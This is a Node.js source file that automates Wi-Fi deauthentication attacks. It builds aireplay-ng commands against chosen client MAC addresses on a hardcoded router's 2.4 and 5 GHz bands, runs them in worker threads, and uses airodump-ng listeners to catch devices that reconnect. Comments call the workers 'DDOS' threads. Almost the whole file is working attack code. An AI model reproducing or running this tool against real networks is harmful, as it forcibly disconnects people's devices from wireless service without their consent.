const { Worker } = require("worker_threads");
const { execSync } = require("child_process");

const INTERFACE = "wlan1";
const parallelWorkers = {
    N2_4GHZ: null,
    N2_4GHZ_Listener: null,
    N5GHZ: null,
    N5GHZ_Listener: null,
    COMMAND_5_GHZ: null,
    COMMAND_2_4_GHZ: null
};

function stopAllThreads(){
    /*
        Stop the execusion of all threads
    */
    if (parallelWorkers.N2_4GHZ){
        parallelWorkers.N2_4GHZ.terminate();
        parallelWorkers.N2_4GHZ = null;
    }
    if (parallelWorkers.N2_4GHZ_Listener){
        parallelWorkers.N2_4GHZ_Listener.terminate();
        parallelWorkers.N2_4GHZ_Listener = null;
    }
    if (parallelWorkers.N5GHZ){
        parallelWorkers.N5GHZ.terminate();
        parallelWorkers.N5GHZ = null;
    }
    if (parallelWorkers.N5GHZ_Listener){
        parallelWorkers.N5GHZ_Listener.terminate();
        parallelWorkers.N5GHZ_Listener = null;
    }
    console.log("Parallel Workers: ", parallelWorkers);
}

function generateDeauthCMD(targets){
    // generates the deauth command to disconnect targets from 2.4 and 5 GHZ WI-FI
    const ROUTER_2_4_GHZ_MAC = "88:AD:43:45:EC:48";
    const ROUTER_5_GHZ_MAC = "88:AD:43:45:EC:50";
    const PACKET_AMT = 10;
    let TARGETS2_4GHZ = "";
    let TARGETS5GHZ = "";

    targets.forEach(device => {
        if (device.mac2_4) {
            TARGETS2_4GHZ += device.mac2_4 + " ";
        }
        if (device.mac5) {
            TARGETS5GHZ += device.mac5 + " ";
        }
    });

    // validate that we have at least 1 target on each network type, if not return null
    const COMMAND_2_4_GHZ = (TARGETS2_4GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_2_4_GHZ_MAC} -c ` + TARGETS2_4GHZ + INTERFACE: null;
    const COMMAND_5_GHZ = (TARGETS5GHZ.length > 0)? `aireplay-ng --deauth ${PACKET_AMT} -a ${ROUTER_5_GHZ_MAC} -c ` + TARGETS5GHZ + INTERFACE: null;


    return [
        COMMAND_2_4_GHZ,
        COMMAND_5_GHZ
    ];
}


function getTargets(allDevices){
    // given all users, find users who where requested to be disconnected
    targets = [];
    for (const name in allDevices){    
        let device = allDevices[name];
        let notConnected = !device.connected;
        if (notConnected){
            targets.push(device);
        }
    }
    return targets;
}

function runParallelDeuth(allDevices){
    /*
        deauthenticates users in parallel using 2 threads
        one thread deauthenticates the user on 2.4 GHZ network while the other 
        deauthenticates the user on 5 GHZ network
    */
    
    let targets = getTargets(allDevices);
    // no targets => do nothing
    if (targets.length < 1){
        return;
    }

    // create threads to execute
    const [ COMMAND_2_4_GHZ, COMMAND_5_GHZ ] = generateDeauthCMD(targets);

    // spawn 2.4 GHZ thread
    if (COMMAND_2_4_GHZ){
        // kill old thread if we need to respawn
        if (parallelWorkers.N2_4GHZ){
            parallelWorkers.N2_4GHZ.terminate();
        }
        
        // spawn thread
        parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
            workerData: COMMAND_2_4_GHZ 
        })
        
        parallelWorkers.N2_4GHZ.on("message", data => {
            console.log(data);
        });
    }
    
    // spawn 5 GHZ thread
    if (COMMAND_5_GHZ){
        // kill old thread if we need to respawn
        if (parallelWorkers.N5GHZ){
            parallelWorkers.N5GHZ.terminate();
        }

        // spawn thread
        parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
            workerData: COMMAND_5_GHZ 
        });
        
        parallelWorkers.N5GHZ.on("message", data => {
            console.log(data);
        });
    }




}

function runParallelDeuthLite(allDevices, networkData){
    /*
        deauthenticates users in parallel using 2 threads
        one thread deauthenticates the user on a specific 
        type of network while we listen for new connections
    */
    
   stopAllThreads();
    let targets = getTargets(allDevices);
    // no targets => do nothing
    if (targets.length < 1){
        return;
    }

    // create threads to execute
    const [ COMMAND_2_4_GHZ, COMMAND_5_GHZ ] = generateDeauthCMD(targets);
    const LISTEN_COMMAND = `airodump-ng --bssid ${networkData.accessMac} --channel ${networkData.channel} ${INTERFACE}`;
    const [ATTACKING_2_4_GHZ_NETWORK, ATTACKING_5_GHZ_NETWORK] = [
        networkData.networkType === '2.4 GHZ' && COMMAND_2_4_GHZ !== null,
        networkData.networkType === '5 GHZ' && COMMAND_5_GHZ !== null
    ];

    // spawn 2.4 GHZ thread
    if (ATTACKING_2_4_GHZ_NETWORK){
        // spawn threads to listen for new connections and attack targets
        parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
            workerData: COMMAND_2_4_GHZ 
        });

        parallelWorkers.N2_4GHZ_Listener = new Worker("./deauthListener2_4.js", {
            workerData: LISTEN_COMMAND 
        });
        
        parallelWorkers.N2_4GHZ.on("message", data => {
            console.log(data);
        });
        
        parallelWorkers.N2_4GHZ.on("error", err => {
            console.log(`2.4 GHZ deuath worker errored with: \n${err} `);
            
            // respwan DDOS thread
            // parallelWorkers.N2_4GHZ.terminate();
            // parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
            //     workerData: parallelWorkers.COMMAND_2_4_GHZ 
            // });
        });
        parallelWorkers.N2_4GHZ_Listener.on("error", err => {
            console.log(`2.4 GHZ listener worker errored with: \n${err} `);
        });
    }
    
    // spawn 5 GHZ thread
    else if (ATTACKING_5_GHZ_NETWORK){
        // spawn threads to listen for new connections and attack targets
        parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
            workerData: COMMAND_5_GHZ 
        })

        parallelWorkers.N5GHZ_Listener = new Worker("./deauthListener5.js", {
            workerData: LISTEN_COMMAND 
        })
        
        parallelWorkers.N5GHZ.on("message", data => {
            console.log(data);
        });

        parallelWorkers.N5GHZ.on("error", err => {
            console.log(`5 GHZ deuath worker errored with: \n${err} `);
            
            // respwan DDOS thread
            // parallelWorkers.N5GHZ.terminate();
            // parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
            //     workerData: parallelWorkers.COMMAND_5_GHZ 
            // });

        });
        parallelWorkers.N5GHZ_Listener.on("error", err => {
            console.log(`5 GHZ listener worker errored with: \n${err} `);
        });
    }
}

function executeCMD(command, type){
    // executes a terminal command
    try {
        stdOut = execSync(command);
    } catch (err) {
        console.log(`${type} errored with: \n${err}`);
    }
    // executeCMD(command, type);
}

function asyncExecuteCMD(command, type){
    // executes a terminal command asynchronously
    exec(command, (err, stdout, stderr) => {
        if (err) {
            console.log(`${type} errored with: \n${stderr}`);
        } else {
            console.log(stdout)
        }
    })
}

module.exports = {
    runParallelDeuth,
    runParallelDeuthLite,
    executeCMD,
    asyncExecuteCMD,
    parallelWorkers
}